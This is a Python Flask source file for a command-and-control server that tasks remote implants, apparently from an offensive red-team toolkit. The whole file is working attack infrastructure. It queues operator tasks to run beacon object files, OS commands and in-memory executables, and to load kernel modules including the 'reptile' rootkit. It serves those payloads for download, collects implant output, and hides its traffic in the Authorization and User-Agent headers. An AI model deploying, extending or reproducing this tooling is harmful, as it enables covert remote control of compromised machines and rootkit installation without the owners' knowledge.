from flask import Flask
from flask import request
from flask import send_from_directory
import base64
import json
import binascii
from struct import pack, calcsize
from collections import deque
import secrets

"""
Tasking an implant to execute 'uname' BOF with '-r' arguemnt provided:
curl -H 'Content-Type: application/json' http://127.0.0.1:8000/tasking -d '{
 "header" : "inline:z",
 "name" : "bof:uname",
 "argv" : "-r"
}'

Tasking an implant to execute 'uname' BOF with '-a' arguemnt and do not unload it after execution ('persist'):
curl -H 'Content-Type: application/json' http://127.0.0.1:8000/tasking -d '{
 "header" : "inline:z:persist",
 "name" : "bof:uname",
 "argv" : "-a"
}'

Structure of tasks (running BOF and passing the buffer content to it):
cmdData1 = {
	"header" : "thread:zb",
	"name" : "bof:udpScanner",
	"argv" : "8.8.8.8:53",
	"buffer" : "file:udpPayloads.txt",
};

Structure of tasks (running BOF ):
cmdData0 = {
	"header" : "callback:",
	"name" : "bof:kernelModLoader",
};

Structure of tasks (running OS commands):
cmdData2 = {
	"header" : "inline:z",
	"name" : "cmd:ls",
	"argv" : "-al",
};

Structure of tasks (running shellcodes):
cmdData3 = {
	"header" : "inline:b",
	"name" : "bin:memfdExecute",
	"buffer" : "file:executableToUpload.exe",
};

Structure of tasks (running kernel modules):
cmdData4 = {
	"header" : "inline:z",
	"name" : "mod:reptile",
	"argv" : "start",
};
"""

app = Flask(__name__)

CHECKIN_IMPLANT_IDENTITY_HEADER = "Authorization"

OUTPUT_RESULT_TASKID_HEADER =  "Authorization"

OUTPUT_RESULT_STATUS_CODE_HEADER =  "User-Agent"
def parseStatusCode(status_code):
    print("Status code: " + status_code)
    _, sc = status_code.split(':')
    return sc

bofsRootDir = "/bofs/"
kmodsRootDir = "/kmods/"

# Fifo queue of tasks to execute by implant
# POST request to /tasking endpoint adds (appendLeft) a new task to it
# GET request to /endpoint endpoint pops a task (if available) from it and starts processing it
TaskFifo = deque()

# Repositories of:
# 1. tasks' input data (sent from operator)
# 2. tasks' output data (sent back from implant) that were successful
# 3. tasks' that failed (returned error code)
# stored under taskID keys 
InputDict = dict()
OutputDict = dict()
ErrorDict = dict()

@app.route("/")
def main_page():
    return "<p>bofs repository</p>"

@app.route("/tasking", methods=['GET', 'POST'])
def addTask():

    if request.method == 'POST' and request.is_json:
        reqData = request.get_json()

        # add unique ID to the task (taskID)
        reqData['id'] = secrets.token_hex()

        # check if all required fields are present
        if not 'name' in reqData or not 'header' in reqData:
            return "<p>Badly formatted taskt!</p>"

        # convert JSON request to string and append it to TaskFifo 
        data = json.dumps(reqData)
        TaskFifo.appendleft(data) 
        return "<p>Consumed</p>"

    # handle GET:
    resp = []
    resp.append("<p>Pending tasks queue:</p>")

    for task in TaskFifo:
        resp.append(task + '<br/>')

    resp.append("<p>Completed tasks:</p>")

    for key, value in InputDict.items():
        if key in OutputDict:
            resp.append('----------------------------------<br/>')
            resp.append('Task ID: ' + key + '<br/>')
            resp.append('Task raw input:<br/>')
            resp.append(value + '<br/><br/>')
            resp.append('Task output:<br/>')
            resp.append(OutputDict[key].decode('utf-8') + '<br/>')
            resp.append('<br/>----------------------------------<br/><br/>')

    resp.append("<p>Failed tasks:</p>")

    for key, value in InputDict.items():
        if key in ErrorDict:
            resp.append('----------------------------------<br/>')
            resp.append('Task ID: ' + key + '<br/>')
            resp.append('Task raw input:<br/>')
            resp.append(value + '<br/><br/>')
            resp.append('Task status code: ' + str(ErrorDict[key]) + '<br/>')
            resp.append('<br/>----------------------------------<br/><br/>')

    
    str_out = ''.join(resp)
    return str_out

def constructJSONInstruction(implant_identity):

    arch, os = implant_identity.split(':')
    if arch == "x86_64":
        arch = "x64"
    if os == "windows":
        os = "coff"
    else:
        os = "elf"

    # get tasking data from TaskFifo and prepare for processing it
    data = TaskFifo.pop()
    cmdData = json.loads(data) # deserialize to JSON

    # request ID for identifying requests (task input data) with responses (tasks output)
    taskID = cmdData['id']

    # store task's input data for logging purposes
    InputDict[taskID] = data

    # Based on task's input data (cmdData), prepare an implant's instruction (Instruction) for execution 
    Instruction = {
        "id": taskID,
        "name": cmdData['name'],
    }

    # we're dealing with BOF-stager's internal command execution here:
    if 'cmd:' in cmdData['name']:
        return Instruction

    # we're dealing with kernel module loading here:
    if 'kmod:' in cmdData['name']:
        # prepare instruction's: 'path' field for kernel modules
        _, name = cmdData['name'].split(':')
        kmodHttpPath = kmodsRootDir + name + ".ko"
        Instruction['path'] = kmodHttpPath
        return Instruction

    # we're dealing with kernel module unloading here:
    if 'kmodrm:' in cmdData['name']:
        return Instruction

    # we're dealing with BOF execution task, so let's:
    # 1. prepare path/URI for the BOF in case when downloading it will be needed
    # 2. calculate requested BOF's hash
    # 3. add bof_hash to the header field
    # 4. if 'persist' is in the header, put it at the last field of the header
    if 'bof:' in cmdData['name']:
        # prepare instruction's: 'path' field for bofs
        _, name = cmdData['name'].split(':')
        bofHttpPath = bofsRootDir + name + "." + os + "." + arch + ".o"
        Instruction['path'] = bofHttpPath
        bofLocalPath = bofHttpPath.lstrip('/')

        # calculate BOF's hash
        with open(bofLocalPath, 'rb') as f:
            bof_hash = format(abs(hash(f.read())), 'x')

        header = cmdData['header']
        if 'persist' in header:
            # replace 'persist' for bof_hash in header and then append 'persist'
            header = header.replace("persist", bof_hash)
            Instruction['header'] = header + ":persist"
        else:
            # append hash to the header:
            Instruction['header'] = header + ":" + bof_hash

    # get args specification possible values: iszZb
    args_spec = header.split(':')[1]

    # skip further processing if no arguments were provided
    if args_spec == "":
        return Instruction 

    if 'argv' not in cmdData:
        return Instruction 

    # prepare cmdData/Instruction for BOF-stager by iterating over 'argv' and inspecting args_spec
    argv = cmdData['argv'].split(' ')
    new_argv = ""
    i = 0
    buf_number = 0

    if len(argv) != len(args_spec):
        print("argv and args_spec mismatched length!")

    while i < len(argv):
        print(argv[i])
        print(args_spec[i])
        
        if len(new_argv) > 0:
            new_argv += " "

        # zero-terminated string
        if args_spec[i] == 'z':
            argv[i] = "z:" + argv[i]
            new_argv += argv[i]
        # integer
        elif args_spec[i] == 'i':
            argv[i] = "i:" + argv[i]
            new_argv += argv[i]
        # short integer
        elif args_spec[i] == 's':
            argv[i] = "s:" + argv[i]
            new_argv += argv[i]
        elif args_spec[i] == 'b':
            # prepare Instruction's field name
            field_name = "buffer" + str(buf_number)
            buf_number += 1
 
            # prepare Instruction's field content
            if 'file:' in argv[i]:
                _, path = argv[i].split(':')
                with open(path, 'rb') as f:
                    Instruction[field_name] = base64.b64encode(f.read()).decode('utf-8')
            else:
                # field is expected to be already base64 encoded
                Instruction[field_name] = argv[i]

            new_argv += str(field_name)

        i += 1

    print("new_argv: " + new_argv)

    # glue together all argv[i]'s and base64 encode it before sending
    Instruction['argv'] = base64.b64encode(new_argv.encode('utf-8')).decode('utf-8')

    # return Implant's Instruction for execution
    return Instruction

def masqueradeInstruction(Instruction):
    csvString = ""
    for key, value in Instruction.items():
        #if key == "header": 
        #    value = value.replace(':', ',')

        csvString += value + ','

    print(csvString)

    return csvString

# GET /endpoint - check if task is available
# POST /endpoint - send in task's output data
@app.route("/endpoint", methods=['GET', 'POST'])
def heartbeat():

    # get implant's output data and add it to the output's store under 'taskID' key
    if request.method == 'POST':
        task_status_hdr = request.headers.get(OUTPUT_RESULT_STATUS_CODE_HEADER)
        status_code = int(parseStatusCode(task_status_hdr))
        taskID = request.headers.get(OUTPUT_RESULT_TASKID_HEADER)

        if status_code == 0:
            data = base64.b64decode(request.get_data())
            OutputDict[taskID] = data
        else:
            ErrorDict[taskID] = status_code
        return ""

    # abort, if there are no tasks to process
    if len(TaskFifo) == 0:
        return "nothing to do"

    # get implant's identification data encoded from (previously agreed) header
    implant_identity = base64.b64decode(request.headers.get(CHECKIN_IMPLANT_IDENTITY_HEADER)).decode('utf-8')
    if not implant_identity:
        return "go away"

    implantInstruction = constructJSONInstruction(implant_identity)

    return masqueradeInstruction(implantInstruction)



@app.route(bofsRootDir + '<path:path>')
def send_report(path):
    return send_from_directory('bofs', path, mimetype='application/octet-stream')

@app.route(kmodsRootDir + '<path:path>')
def send_kmod(path):
    return send_from_directory('kmods', path, mimetype='application/octet-stream')



if __name__ == '__main__':
    app.run(host='127.0.0.1',port=8000,debug=True)
